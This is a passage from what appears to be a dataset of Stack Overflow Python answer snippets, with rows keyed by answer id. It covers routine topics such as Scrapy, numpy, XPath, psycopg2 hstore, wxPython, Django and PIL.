    start_urls = [str(get_url())]
    extractor = SgmlLinkExtractor()
    rules = (Rule(extractor, callback='web_crawling',follow=True),)
    def web_crawling(self, response):
       settingObj=Settings()    
       crawler=Crawler(settingObj)
       stat = StatsCollector(crawler)
       depth = stat.get_value('pages_crawled')
       return depth
</snippet></ROW><ROW><id>20358013</id><snippet>spidey.py</snippet></ROW><ROW><id>20358013</id><snippet>virtualenv venv
venv/bin/pip install scrapy
venv/bin/scrapy runspider spidey.py
</snippet></ROW><ROW><id>20358307</id><snippet>eval</snippet></ROW><ROW><id>20358307</id><snippet>json</snippet></ROW><ROW><id>20358307</id><snippet>pickle</snippet></ROW><ROW><id>20358307</id><snippet>:</snippet></ROW><ROW><id>20358307</id><snippet>=</snippet></ROW><ROW><id>20358307</id><snippet>{'a': 3, 'b': 'user\'s test'}</snippet></ROW><ROW><id>20358307</id><snippet>'</snippet></ROW><ROW><id>20358347</id><snippet>&gt;&gt;&gt; np.random.seed(100)
</snippet></ROW><ROW><id>20358347</id><snippet>&gt;&gt;&gt; a = np.random.random([5,5])
</snippet></ROW><ROW><id>20358347</id><snippet>&gt;&gt;&gt; (a &gt;.7).sum(axis=1)
array([1, 0, 3, 1, 2])
</snippet></ROW><ROW><id>20358347</id><snippet>np.where</snippet></ROW><ROW><id>20358347</id><snippet>&gt;&gt;&gt; np.where((a &gt; .7).sum(axis=1) &gt;= 2)
(array([2, 4]),)
</snippet></ROW><ROW><id>20358347</id><snippet>&gt;&gt;&gt; a[(a &gt; .7).sum(axis=1) &gt;= 2]
array([[ 0.89041156,  0.98092086,  0.05994199,  0.89054594,  0.5769015 ],
       [ 0.54468488,  0.76911517,  0.25069523,  0.28589569,  0.85239509]])
</snippet></ROW><ROW><id>20358467</id><snippet>|</snippet></ROW><ROW><id>20358467</id><snippet>'''/osm/way/nd[@ref=203936110]/following-sibling::nd[1] 
   | /osm/way/nd[@ref=203936110]/preceding-sibling::nd[1]'''
</snippet></ROW><ROW><id>20358467</id><snippet>import lxml.etree as ET
content = '''\
&lt;record&gt;
    &lt;nd&gt;First&lt;/nd&gt;
    &lt;nd&gt;Second&lt;/nd&gt;
    &lt;nd ref="203936110"&gt;&lt;/nd&gt;
    &lt;nd&gt;Third&lt;/nd&gt;
    &lt;nd&gt;Fourth&lt;/nd&gt;    
&lt;/record&gt;'''
root = ET.fromstring(content)

for elt in root.xpath('''
    //nd[@ref="203936110"]/following-sibling::nd[1]
    |
    //nd[@ref="203936110"]/preceding-sibling::nd[1]'''):

    print(elt.text)
</snippet></ROW><ROW><id>20358467</id><snippet>Second
Third
</snippet></ROW><ROW><id>20358491</id><snippet>SQLAlchemy</snippet></ROW><ROW><id>20358494</id><snippet>update</snippet></ROW><ROW><id>20358494</id><snippet>None</snippet></ROW><ROW><id>20358494</id><snippet>a</snippet></ROW><ROW><id>20358494</id><snippet>udpate</snippet></ROW><ROW><id>20358494</id><snippet>D.update([E, ]**F) -&gt; **None**.  Update D from dict/iterable E and F.
If E present and has a .keys() method, does:     for k in E: D[k] = E[k]
If E present and lacks .keys() method, does:     for (k, v) in E: D[k] = v
In either case, this is followed by: for k in F: D[k] = F[k]
</snippet></ROW><ROW><id>20358500</id><snippet>for i in range(len(self.sensors)):
    print self.sensors[i].position()
</snippet></ROW><ROW><id>20358500</id><snippet>#! /usr/bin/python2.7

class Sensor:

    def __init__(self, loc, size=1, enabled=True):
        self.enabled = enabled
        self.distOfBorderFrmCentre = size / 2.0
        self.location = loc


    def position(self):
        return self.location

sensors = [ Sensor(loc) for loc in ('Loc 1', 'Loc 2', 'Loc 3') ]
for i in range(len(sensors)):
    print sensors[i].position()

#Previous two lines are a bit senseless, you can use:
for sensor in sensors:
    print sensor.position()
</snippet></ROW><ROW><id>20358715</id><snippet>\r</snippet></ROW><ROW><id>20358715</id><snippet>'test1' + proj.rstrip() + 'test2'
</snippet></ROW><ROW><id>20358715</id><snippet>\r</snippet></ROW><ROW><id>20358715</id><snippet>test1...</snippet></ROW><ROW><id>20358715</id><snippet>\r</snippet></ROW><ROW><id>20358821</id><snippet>HSTORE</snippet></ROW><ROW><id>20358821</id><snippet>dict</snippet></ROW><ROW><id>20358821</id><snippet>SELECT 'foo=&gt;1,bar=&gt;2,spam=&gt;3,eggs=&gt;4'::hstore
UNION ALL
SELECT hstore('{foo,1,bar,2,spam,3,eggs,4}'::TEXT[])
UNION ALL
SELECT hstore('{{foo,1},{bar,2},{spam,3},{eggs,4}}'::TEXT[])
UNION ALL
SELECT hstore('{foo,bar,spam,eggs}'::TEXT[], '{1,2,3,4}'::TEXT[])
</snippet></ROW><ROW><id>20358821</id><snippet>""bar"=&gt;"2", "foo"=&gt;"1", "eggs"=&gt;"4", "spam"=&gt;"3""
""bar"=&gt;"2", "foo"=&gt;"1", "eggs"=&gt;"4", "spam"=&gt;"3""
""bar"=&gt;"2", "foo"=&gt;"1", "eggs"=&gt;"4", "spam"=&gt;"3""
""bar"=&gt;"2", "foo"=&gt;"1", "eggs"=&gt;"4", "spam"=&gt;"3""
</snippet></ROW><ROW><id>20358821</id><snippet>HSTORE</snippet></ROW><ROW><id>20358821</id><snippet>hstore_to_matrix()</snippet></ROW><ROW><id>20358821</id><snippet>HSTORE</snippet></ROW><ROW><id>20358821</id><snippet>OrderedDict</snippet></ROW><ROW><id>20358821</id><snippet>import collections
import psycopg2
import psycopg2.extras

pg = psycopg2.connect(...)
psycopg2.extras.register_hstore(pg)
cursor = pg.cursor()

cursor.execute("""
    SELECT hstore_to_matrix('a=&gt;1,b=&gt;2,c=&gt;3'::hstore);
""")
pairs = cursor.fetchone()[0]
ordered = collections.OrderedDict(pairs)

print(pairs)
# [['a', '1'], ['b', '2'], ['c', '3']]
print(ordered)
# OrderedDict([('a', '1'), ('b', '2'), ('c', '3')])
</snippet></ROW><ROW><id>20358821</id><snippet>psycopg2</snippet></ROW><ROW><id>20358821</id><snippet>.keys()</snippet></ROW><ROW><id>20358821</id><snippet>.values()</snippet></ROW><ROW><id>20358821</id><snippet>HSTORE</snippet></ROW><ROW><id>20358821</id><snippet>HSTORE</snippet></ROW><ROW><id>20358821</id><snippet>OrderedDict</snippet></ROW><ROW><id>20358821</id><snippet>dict</snippet></ROW><ROW><id>20358821</id><snippet># This will save the data as ordered.
data = OrderedDict([('a', '1'), ('b', '2'), ('c', '3')])
cursor.update("""
    UPDATE mytable
    SET ordered = %(data)s;
""", {
    'data': data
})

# This will save the data as unordered. Whatever the internal order
# happens to be for the dict will be sent. When I run it in the python
# interpreter, it results in:
#   [('a', '1'), ('c', '3'), ('b', '2')]
cursor.update("""
    UPDATE mytable
    SET ordered = %(data)s;
""", {
    'data': data
})
</snippet></ROW><ROW><id>20358866</id><snippet>print</snippet></ROW><ROW><id>20358866</id><snippet>';'.join(...)</snippet></ROW><ROW><id>20358954</id><snippet>cls</snippet></ROW><ROW><id>20358954</id><snippet>valid_kwargs = get_valid_kwargs(cls.__init__, config_dict)
</snippet></ROW><ROW><id>20358954</id><snippet>MyDerivedClass.from_yaml()</snippet></ROW><ROW><id>20358954</id><snippet>cls</snippet></ROW><ROW><id>20358954</id><snippet>MyDerivedClass</snippet></ROW><ROW><id>20358984</id><snippet>*</snippet></ROW><ROW><id>20358984</id><snippet>n</snippet></ROW><ROW><id>20358984</id><snippet>&gt;&gt;&gt; n = 10
&gt;&gt;&gt; 'L' * n
'LLLLLLLLLL'
&gt;&gt;&gt; n = int(raw_input(':'))
:2
&gt;&gt;&gt; 'L' * n
'LL'
&gt;&gt;&gt;
</snippet></ROW><ROW><id>20358984</id><snippet>raw_input</snippet></ROW><ROW><id>20358984</id><snippet>input</snippet></ROW><ROW><id>20358984</id><snippet>str.format</snippet></ROW><ROW><id>20358984</id><snippet>&gt;&gt;&gt; n = int(raw_input(':'))
:7
&gt;&gt;&gt; ["c{}".format(x) for x in xrange(1, n+1)]
['c1', 'c2', 'c3', 'c4', 'c5', 'c6', 'c7']
&gt;&gt;&gt;
</snippet></ROW><ROW><id>20358984</id><snippet>xrange</snippet></ROW><ROW><id>20358984</id><snippet>range</snippet></ROW><ROW><id>20359148</id><snippet>class Tester(wx.Frame):
    def OnTxtScroll(self,e):
        currScroll = self.panel.GetViewStart()
        newScroll = (currScroll[0],currScroll[1]- e.GetWheelRotation()/120)
        self.panel.Scroll(*newScroll)

    def __init__(self):
        ....
        #your code
        ....
        self.panel = panel
        textBox.Bind(wx.EVT_MOUSEWHEEL,self.OnTxtScroll)
</snippet></ROW><ROW><id>20359148</id><snippet> def OnTxtScroll(self,e):
        print dir(e)
        target = e.GetEventObject()
        p1 = target.GetScrollPos(wx.VERTICAL)
        e.Skip()
        self.Update()
        def updateScroll(p1,target,scroll_amt):
            p2 = target.GetScrollPos(wx.VERTICAL)
            if p1 ==p2:#scroll did not effect target object so lets scroll our main panel
                currScroll = self.panel.GetViewStart()
                newScroll = (currScroll[0],currScroll[1]- scroll_amt)
                self.panel.Scroll(*newScroll)
        wx.CallAfter(updateScroll,p1,target,e.GetWheelRotation()/120)
</snippet></ROW><ROW><id>20359217</id><snippet>str.split</snippet></ROW><ROW><id>20359217</id><snippet>&gt;&gt;&gt; from numpy import array
&gt;&gt;&gt; a = array(['java database servlets derby', 'java graphics groovy awt basic',
...            'java lucene', 'javascript android',
...            'iphone ios ipad file uiimage',
...            'javascript jquery transition effect'])
&gt;&gt;&gt; list_of_lists = [x.split() for x in a]
&gt;&gt;&gt; list_of_lists
[['java', 'database', 'servlets', 'derby'],
 ['java', 'graphics', 'groovy', 'awt', 'basic'],
 ['java', 'lucene'],
 ['javascript', 'android'],
 ['iphone', 'ios', 'ipad', 'file', 'uiimage'],
 ['javascript', 'jquery', 'transition', 'effect']]
</snippet></ROW><ROW><id>20359236</id><snippet>1, Alice, Alison, 010180, 55, 2500, F
</snippet></ROW><ROW><id>20359236</id><snippet>def find():
    num = 1
    f = open('Customerlist.txt', 'r') #Open file
    search = f.readlines() #read data into memory (list of strings)
    f.close() #close file again
    for line in search:
        lst = line.split(", ") #split on the seperator - in this case a comma and space
        if str(num) == lst[0]: #Check if the string representation of your number equals the first parameter in your lst.
            print "ID: %s" % lst[0]
            print "Name: %s" % lst[1]
            print "Surname: %s" % lst[2]
            print "DOB: %s" % lst[3]
            print "hnumber: %s" % lst[4]
            print "Postcode: %s" % lst[5]
            print "Gender: %s" % lst[6]
</snippet></ROW><ROW><id>20359236</id><snippet>ID: 1
Name: Alice
Surname: Alison
DOB: 010180
hnumber: 55
Postcode: 2500
Gender: F
</snippet></ROW><ROW><id>20359236</id><snippet>strip()</snippet></ROW><ROW><id>20359322</id><snippet>__name__</snippet></ROW><ROW><id>20359322</id><snippet>import saml.xyz</snippet></ROW><ROW><id>20359322</id><snippet>__name__</snippet></ROW><ROW><id>20359322</id><snippet>apps.saml.xyz</snippet></ROW><ROW><id>20359322</id><snippet>apps.saml.xyz</snippet></ROW><ROW><id>20359322</id><snippet>saml.xyz</snippet></ROW><ROW><id>20359322</id><snippet>apps/</snippet></ROW><ROW><id>20359322</id><snippet>sys.path</snippet></ROW><ROW><id>20359450</id><snippet>import random
import wx

########################################################################
class Panel(wx.Panel):
    """"""

    #----------------------------------------------------------------------
    def __init__(self, parent):
        """Constructor"""
        wx.Panel.__init__(self, parent)

        self.call_function = None
        self.choices = ["this", "that", "something", "other", "python"]

        btn = wx.Button(self, label="Change Variable Value")
        btn.Bind(wx.EVT_BUTTON, self.onButton)

    #----------------------------------------------------------------------
    def onButton(self, event):
        """
        Change the value of self.call_function
        """
        self.call_function = random.choice(self.choices)
        print self.call_function

########################################################################
class Frame(wx.Frame):
    """"""

    #----------------------------------------------------------------------
    def __init__(self):
        """Constructor"""
        wx.Frame.__init__(self, None, title="Return value")
        panel = Panel(self)
        self.Show()

#----------------------------------------------------------------------
if __name__ == "__main__":
    app = wx.App(False)
    frame = Frame()
    app.MainLoop()
</snippet></ROW><ROW><id>20359522</id><snippet>fn</snippet></ROW><ROW><id>20359522</id><snippet>fun</snippet></ROW><ROW><id>20359522</id><snippet>def concurrent_run(fun, j):
   #               ^^^
   for i in j:
       Thread(target=fn, args=(i)).start()
       #             ^^       ^^^
</snippet></ROW><ROW><id>20359522</id><snippet>args=(i,)</snippet></ROW><ROW><id>20359597</id><snippet>12:00:00</snippet></ROW><ROW><id>20359597</id><snippet>from datetime import datetime

def time_diff(start, end):
    start_dt = datetime.strptime(start, '%H:%M:%S')
    end_dt = datetime.strptime(end, '%H:%M:%S')
    diff = (end_dt - start_dt)
    return diff.seconds

scores = {}
with open('input.txt') as fin:
    for line in fin.readlines():
        values = line.split(',')
        scores[values[0]] = time_diff(values[1],values[2])

with open('sorted.txt', 'w') as fout:
    for key, value in sorted(scores.iteritems(), key=lambda (k,v): (v,k)):
        fout.write('%s,%s\n' % (key, value))
</snippet></ROW><ROW><id>20360033</id><snippet>int(s, 16)</snippet></ROW><ROW><id>20360033</id><snippet>s</snippet></ROW><ROW><id>20360033</id><snippet>chr()</snippet></ROW><ROW><id>20360033</id><snippet>chr(int('4A', 16))</snippet></ROW><ROW><id>20360033</id><snippet>'J'</snippet></ROW><ROW><id>20360033</id><snippet>'\x'</snippet></ROW><ROW><id>20360033</id><snippet>\xAA</snippet></ROW><ROW><id>20360033</id><snippet>v = 0x4A   # the proper way to write int literals in hex
print chr(v)

v = 74     # without the 0x, this is interpreted as decimal
print chr(v)

v = '4A'   # in quotes, it can be anything you like, but then you need int(v,16)
print chr(int(v, 16))
</snippet></ROW><ROW><id>20360195</id><snippet>data.append([data[-1][0]+1, newRandomValue])
</snippet></ROW><ROW><id>20360313</id><snippet>MousePos</snippet></ROW><ROW><id>20360313</id><snippet>import pygame
from pygame.locals import *
pygame.init()
Screen = pygame.display.set_mode([1000, 600])
MousePos = pygame.mouse.get_pos()
Contin = True
while Contin:
    MousePos = pygame.mouse.get_pos()
    print(MousePos)
    DoSomething(MousePos)
</snippet></ROW><ROW><id>20360313</id><snippet>while running:
     event = pygame.event.poll()
     if event.type == pygame.QUIT:
         running = 0
     elif event.type == pygame.MOUSEMOTION:
         print "mouse at (%d, %d)" % event.pos
</snippet></ROW><ROW><id>20360343</id><snippet>string in line</snippet></ROW><ROW><id>20360343</id><snippet>dicts</snippet></ROW><ROW><id>20360343</id><snippet>loaded 120000 lines
question regex    0.114868402481
simpler regex     0.417045307159
other regex       0.386662817001
startswith        0.236350297928
string in         0.020356798172  &lt;-- iteration winner
dict construction 0.611148500443
dict lookup       0.000002503395  &lt;-- best if you are doing many lookups
</snippet></ROW><ROW><id>20360343</id><snippet>import re
import timeit

def timefunc(function, times, *args):
    def wrap():
        function(*args)
    t = timeit.Timer(wrap)
    return t.timeit(times) / times

def question(lines):
    eanic = "D41RP9"
    matcher = re.compile('^(?:'+eanic.strip()+'(?:;|$)|[^;]*;'+eanic.strip()+'(?:;|$))').match
    line=[next(l.split(';') for l in lines if matcher(l))]
    return line

def splitstart(lines):
    eanic = "D41RP9"
    ret = []
    for l in lines:
        s = l.split(';')
        if s[0].startswith(eanic) or s[1].startswith(eanic):
            ret.append(l)
    return ret

def simpler(lines):
    eanic = "D41RP9"
    matcher = re.compile('(^|;)' + eanic)
    return [l for l in lines if matcher.search(l)]

def better(lines):
    eanic = "D41RP9"
    matcher = re.compile('^(?:' + eanic + '|[^;]*;' + eanic + ')')
    return [l for l in lines if matcher.match(l)]

def strin(lines):
    eanic = "D41RP9"
    return [l for l in lines if eanic in l]

def mkdicts(lines):
    ean = {}
    plu = {}
    for l in lines:
        s = l.split(';')
        ean[s[0]] = s
        plu[s[1]] = s
    return (ean, plu)

def searchdicts(ean, plu):
    eanic = "D41RP9"
    return (ean.get(eanic, None), plu.get(eanic, None))

with open('test.txt', 'r') as f:
    lines = f.readlines()

    print "loaded", len(lines), "lines"
    print "question regex\t", timefunc(question, 10, lines)
    print "simpler regex\t", timefunc(simpler, 10, lines)
    print "other regex\t", timefunc(simpler, 10, lines)
    print "startswith\t", timefunc(splitstart, 10, lines)
    print "string in\t", timefunc(strin, 10, lines)
    print "dict construction\t", timefunc(mkdicts, 10, lines)
    ean, plu = mkdicts(lines)
    print "dict lookup\t", timefunc(searchdicts, 10, ean, plu)
</snippet></ROW><ROW><id>20360600</id><snippet>zip</snippet></ROW><ROW><id>20360600</id><snippet>map</snippet></ROW><ROW><id>20360600</id><snippet>&gt;&gt;&gt; map(list, zip(A, B))
[['5', '1'], ['6', '2'], ['7', '3'], ['8', '4']]
&gt;&gt;&gt; [list(x) for x in  zip(A, B)]
[['5', '1'], ['6', '2'], ['7', '3'], ['8', '4']]
</snippet></ROW><ROW><id>20360752</id><snippet>doctest</snippet></ROW><ROW><id>20360909</id><snippet>on_resize</snippet></ROW><ROW><id>20360930</id><snippet>field_vals = [[1, 89.99999999446867, 90.3567070001462],
              [2, 88.99999999460778, 89.83622323918551], 
              [3, 87.99999999448423, 89.1722770229037]]
for field in field_vals:
    _, b, c = field
    print '{:.2f} {:.2f}'.format(b, c)


90.00 90.36
89.00 89.84
88.00 89.17
</snippet></ROW><ROW><id>20360930</id><snippet>b</snippet></ROW><ROW><id>20360930</id><snippet>c</snippet></ROW><ROW><id>20360930</id><snippet>89.99</snippet></ROW><ROW><id>20360930</id><snippet>90.00</snippet></ROW><ROW><id>20361032</id><snippet>fork()</snippet></ROW><ROW><id>20361032</id><snippet>fork()</snippet></ROW><ROW><id>20361032</id><snippet>fork()</snippet></ROW><ROW><id>20361032</id><snippet>__name__ == '__main__'</snippet></ROW><ROW><id>20361032</id><snippet>__name__ == "__main__"</snippet></ROW><ROW><id>20361111</id><snippet>class OrderProduct(BaseModel):
    order = models.ForeignKey(Order)
    product = models.ForeignKey(Product)
    quantity = models.IntegerField()
</snippet></ROW><ROW><id>20361111</id><snippet>class Order(BaseModel):
    company = models.ForeignKey(Company)
    products = models.ManyToManyField(Product, through='OrderProduct')
</snippet></ROW><ROW><id>20361111</id><snippet>order.products.add(prod)</snippet></ROW><ROW><id>20361111</id><snippet>through</snippet></ROW><ROW><id>20361111</id><snippet>prod = Product.objects.get(uuid=product)
#order.products.add(prod)
q = product_quantity
order = order # order record must be created before

OrderProduct.objects.create(order=order, product=prod, quantity=q)
</snippet></ROW><ROW><id>20361273</id><snippet>add</snippet></ROW><ROW><id>20361273</id><snippet>remove</snippet></ROW><ROW><id>20361273</id><snippet> permission = Permission.objects.get(name='Can view poll')
 u.user_permissions.add(permission)
</snippet></ROW><ROW><id>20361306</id><snippet>webdriver.page_source</snippet></ROW><ROW><id>20361306</id><snippet>&lt;a.+?href=['"](.*?)['"].*?/?&gt;
</snippet></ROW><ROW><id>20361306</id><snippet>webdriver.find_elements_by_css_selector('.visit')</snippet></ROW><ROW><id>20361306</id><snippet>find_elements_...</snippet></ROW><ROW><id>20361306</id><snippet>find_element_...</snippet></ROW><ROW><id>20361306</id><snippet>hrefs = []
elements = webdriver.find_elements_by_css_selector('.visit')

for element in elements:
    hrefs.append(element.getAttribute('href'))
</snippet></ROW><ROW><id>20361306</id><snippet>hrefs = [element.getAttribute('href') for element \
         in webdriver.find_elements_by_css_selector('.visit')]
</snippet></ROW><ROW><id>20361438</id><snippet>Manager.__init__</snippet></ROW><ROW><id>20361438</id><snippet>__setattr__</snippet></ROW><ROW><id>20361438</id><snippet>person</snippet></ROW><ROW><id>20361438</id><snippet>__setattr__</snippet></ROW><ROW><id>20361438</id><snippet>self.person</snippet></ROW><ROW><id>20361438</id><snippet>__dict__</snippet></ROW><ROW><id>20361438</id><snippet>__getattr__</snippet></ROW><ROW><id>20361438</id><snippet>self.person</snippet></ROW><ROW><id>20361438</id><snippet>__setattr__</snippet></ROW><ROW><id>20361438</id><snippet>Manager.__init__</snippet></ROW><ROW><id>20361438</id><snippet>class Manager(object):
    def __init__(self,name,pay):
        self.__dict__['person']=Person(name,'mgr',pay)
</snippet></ROW><ROW><id>20361438</id><snippet>__getattr__('person')</snippet></ROW><ROW><id>20361438</id><snippet>self.person</snippet></ROW><ROW><id>20361438</id><snippet>__getattr__</snippet></ROW><ROW><id>20361574</id><snippet>values = line.strip().split(' ')
</snippet></ROW><ROW><id>20361739</id><snippet>0 * 0</snippet></ROW><ROW><id>20361739</id><snippet>left = right &amp; top = bottom</snippet></ROW><ROW><id>20361739</id><snippet>from PIL import Image

test_image = "Fedora_19_with_GNOME.jpg"
original = Image.open(test_image)
original.show()

width, height = original.size   # Get dimensions
left = width/4
top = height/4
right = 3 * width/4
bottom = 3 * height/4
cropped_example = original.crop((left, top, right, bottom))

cropped_example.show()
</snippet></ROW><ROW><id>20361932</id><snippet>importme.MyClass</snippet></ROW><ROW><id>20361932</id><snippet>repr</snippet></ROW><ROW><id>20361932</id><snippet>repr</snippet></ROW><ROW><id>20361932</id><snippet>MyClass</snippet></ROW><ROW><id>20361932</id><snippet>repr</snippet></ROW><ROW><id>20361932</id><snippet>__repr__</snippet></ROW><ROW><id>20361932</id><snippet>import importme</snippet></ROW><ROW><id>20361932</id><snippet>getattr(sys.modules['importme'], sys.argv[1])
</snippet></ROW><ROW><id>20361932</id><snippet>getattr(importme, sys.argv[1])
</snippet></ROW><ROW><id>20361932</id><snippet>m = getattr(importme, sys.argv[1])()
</snippet></ROW><ROW><id>20361945</id><snippet>with open('myfile.fasta', 'rU') as fp:
   ...
</snippet></ROW><ROW><id>20361945</id><snippet>'\n'</snippet></ROW><ROW><id>20361945</id><snippet>if c == '\n':
</snippet></ROW><ROW><id>20362278</id><snippet>&gt;&gt;&gt; lis = [['A',1,2],['B',3,4]]
&gt;&gt;&gt; [', '.join(map(str, x)) for x in lis ]
['A, 1, 2', 'B, 3, 4']
</snippet></ROW><ROW><id>20362745</id><snippet>NxN</snippet></ROW><ROW><id>20362745</id><snippet>w = np.array([[0.2,0.8],[0.5,0.5], [0.33, 0.67]])
covar = np.array([0.000046,0.000017,0.000017,0.000032]).reshape([2,2])
(np.dot(w, covar) * w).sum(axis=-1)
=&gt; array([  2.77600000e-05,   2.80000000e-05,   2.68916000e-05])
</snippet></ROW><ROW><id>20362745</id><snippet># first multiplication (in both solutions)
np.dot(w, covar).shape
(3, 2)
# second, my solution
(np.dot(w, covar) * w).shape
(3, 2)
# second, Adam's solution
np.dot(np.dot(w,covar),w.T).shape
(3, 3)
</snippet></ROW><ROW><id>20362745</id><snippet>N</snippet></ROW><ROW><id>20362745</id><snippet>N=3</snippet></ROW><ROW><id>20362745</id><snippet>M</snippet></ROW><ROW><id>20362745</id><snippet>M=2</snippet></ROW><ROW><id>20362745</id><snippet>N&gt;&gt;M</snippet></ROW><ROW><id>20362745</id><snippet>NxN</snippet></ROW><ROW><id>20362767</id><snippet>    else:
        dictkeys.remove(sampleKey)
        chooseSampleKey(peeps, dictkeys)
        # here &lt;-----------
else:
    return 0
</snippet></ROW><ROW><id>20362767</id><snippet>None</snippet></ROW><ROW><id>20362859</id><snippet>for f in data:
    print f['update_date']
    print f['summary']
</snippet></ROW><ROW><id>20362954</id><snippet>import requests
response = requests.get('https://websitewithfile.com/text.txt',verify=False, auth=('user', 'pass'))
print(response.text)
</snippet></ROW><ROW><id>20362954</id><snippet>with open('filename.txt','w') as fout:
   fout.write(response.text):
</snippet></ROW><ROW><id>20363116</id><snippet>utf-8</snippet></ROW><ROW><id>20363116</id><snippet>utf-8</snippet></ROW><ROW><id>20363116</id><snippet>sentences = [ "the quick brown fox jumps over the lazy dogs",
"Then a cop quizzed Mick Jagger's ex-wives briefly." ]
word2vec.Word2Vec([s.encode('utf-8').split() for s in sentences], size=100, window=5, min_count=5, workers=4)
</snippet></ROW><ROW><id>20363289</id><snippet>try:
    # Do something
    myurl = urllib.urlopen(parametes)
    assert myurl.status == 202
except Exception as e:
    # Handle Exception
    print('An error occured')
    if isinstance(e, AssertionError):
        # Handle AssertionError
        print('it was something serious too!')
else:
    # proceed normal stuff
</snippet></ROW><ROW><id>20363379</id><snippet>&gt;&gt;&gt; lis = [0,0,2,0,0,0,0,0,0,0]
&gt;&gt;&gt; len(lis) - lis.count(0)
1
</snippet></ROW><ROW><id>20363411</id><snippet>import ast
lst = ast.literal_eval(s)
</snippet></ROW><ROW><id>20363411</id><snippet>eval</snippet></ROW><ROW><id>20363411</id><snippet>lst = eval(s)
</snippet></ROW><ROW><id>20363411</id><snippet>&gt;&gt;&gt; s = '[54, 95, 45, -97, -51, 84, 0, 32, -55, 14, 50, 54, 68, -3, 57, 88, -1]' 
&gt;&gt;&gt; def f1():
...    eval(s)
... 
&gt;&gt;&gt; def f2():
...    ast.literal_eval(s)
... 
&gt;&gt;&gt; timeit.timeit('f1()', 'from __main__ import f1')
31.415852785110474
&gt;&gt;&gt; timeit.timeit('f2()', 'from __main__ import f2')
46.25958704948425
</snippet></ROW><ROW><id>20363411</id><snippet>eval</snippet></ROW><ROW><id>20363411</id><snippet>ast.literal_eval</snippet></ROW><ROW><id>20363411</id><snippet>eval</snippet></ROW><ROW><id>20363528</id><snippet>pyreadline</snippet></ROW><ROW><id>20363528</id><snippet>lib\site-packages</snippet></ROW><ROW><id>20363656</id><snippet>In [11]: df.pivot_table('event_time', 'session_id', 'object',
                         aggfunc=len, fill_value=0)
Out[11]: 
object      A  B  C  E  J  O
session_id                  
1           1  1  1  1  0  0
2           2  0  0  0  1  1
</snippet></ROW><ROW><id>20363668</id><snippet>is</snippet></ROW><ROW><id>20363668</id><snippet>'None'</snippet></ROW><ROW><id>20363668</id><snippet>None</snippet></ROW><ROW><id>20363668</id><snippet>!=</snippet></ROW><ROW><id>20363668</id><snippet>item != 'None'
</snippet></ROW><ROW><id>20363668</id><snippet>is</snippet></ROW><ROW><id>20363672</id><snippet>TEMPLATE_CONTEXT_PROCESSORS</snippet></ROW><ROW><id>20363672</id><snippet>"django.contrib.auth.context_processors.auth",
"django.core.context_processors.debug",
"django.core.context_processors.i18n",
"django.core.context_processors.media",
"django.core.context_processors.static",
"django.core.context_processors.tz",
"django.contrib.messages.context_processors.messages"
</snippet></ROW><ROW><id>20363672</id><snippet>user</snippet></ROW><ROW><id>20363672</id><snippet>"django.contrib.auth.context_processors.auth"</snippet></ROW><ROW><id>20364174</id><snippet>image == color
</snippet></ROW><ROW><id>20364174</id><snippet>color</snippet></ROW><ROW><id>20364174</id><snippet>np.all</snippet></ROW><ROW><id>20364174</id><snippet>-1</snippet></ROW><ROW><id>20364174</id><snippet>np.all(image == color, axis=-1)
</snippet></ROW><ROW><id>20364174</id><snippet>True</snippet></ROW><ROW><id>20364174</id><snippet>color</snippet></ROW><ROW><id>20364174</id><snippet>False</snippet></ROW><ROW><id>20364174</id><snippet>np.all(im1==c1, -1) &amp; np.all(im2==c2, -1)
</snippet></ROW><ROW><id>20364174</id><snippet>np.sum</snippet></ROW><ROW><id>20364174</id><snippet>True</snippet></ROW><ROW><id>20364174</id><snippet>1</snippet></ROW><ROW><id>20364174</id><snippet>False</snippet></ROW><ROW><id>20364174</id><snippet>0</snippet></ROW><ROW><id>20364174</id><snippet>def compare_colors(im1, im2, c1, c2):
    matches = np.all(im1==c1, -1) &amp; np.all(im2==c2, -1)
    return matches.sum()
</snippet></ROW><ROW><id>20364174</id><snippet>&gt;&gt;&gt; a = np.random.choice([0, 255], (20,20,3))
&gt;&gt;&gt; b = np.random.choice([0, 255], (20,20,3))
&gt;&gt;&gt; compare_colors(a, b, [255, 0, 255], [0, 255, 0])
12
</snippet></ROW><ROW><id>20364174</id><snippet>np.where</snippet></ROW><ROW><id>20364174</id><snippet>128</snippet></ROW><ROW><id>20364174</id><snippet>0</snippet></ROW><ROW><id>20364174</id><snippet>255</snippet></ROW><ROW><id>20364174</id><snippet>np.where(a&lt;128, 0, 255)
</snippet></ROW><ROW><id>20364174</id><snippet>def clean(a, thresh=128, under=0, over=255):
    return np.where(a&lt;128, under, over)
</snippet></ROW><ROW><id>20364174</id><snippet>8*8</snippet></ROW><ROW><id>20364174</id><snippet># some fake data (has values between 0 and 255 for r, g, and b)
H, W = 20, 20
a = np.random.randint(0, 256, (H,W,3))
b = np.random.randint(0, 256, (H,W,3))

# clean the images:
ac = clean(a)
bc = clean(b)

# build a list of all pairs of all 8 colors using itertools.product:
col_combos = itertools.product(itertools.product((0,255), repeat=3), repeat=2)

# now apply the comparison to the images for each pair of colors
col_dict = { (c1,c2): compare_colors(ac, bc, c1, c2) for c1,c2 in col_combos }
</snippet></ROW><ROW><id>20364174</id><snippet>col_dict</snippet></ROW><ROW><id>20364174</id><snippet>&gt;&gt;&gt; col_dict[((0, 255, 255), (255, 0, 255))]
8
</snippet></ROW><ROW><id>20364300</id><snippet>db.collection.find().forEach(function (tweet){
    db.collection.update({_id: tweet._id}, 
                         {$set: {created_at: new Date(tweet.created_at)}});
});
</snippet></ROW><ROW><id>20364437</id><snippet>with open('file.txt', 'r') as fin:
    data = fin.read().splitlines(True)
with open('file.txt', 'w') as fout:
    fout.writelines(data[1:])
</snippet></ROW><ROW><id>20364437</id><snippet>open</snippet></ROW><ROW><id>20364522</id><snippet>__eq__</snippet></ROW><ROW><id>20364522</id><snippet>q = Queue([1,2,3])
q1 = None
q==q1
</snippet></ROW><ROW><id>20364522</id><snippet>q = Queue([1,2,3])
q == None
</snippet></ROW><ROW><id>20364522</id><snippet>Queue.__eq__</snippet></ROW><ROW><id>20364522</id><snippet>def __eq__(self, other):
    return self.container.__eq__(other.container)
</snippet></ROW><ROW><id>20364522</id><snippet>other</snippet></ROW><ROW><id>20364522</id><snippet>None</snippet></ROW><ROW><id>20364522</id><snippet>self.container.__eq__(None.container)
</snippet></ROW><ROW><id>20364522</id><snippet>'NoneType' object has no attribute 'container'
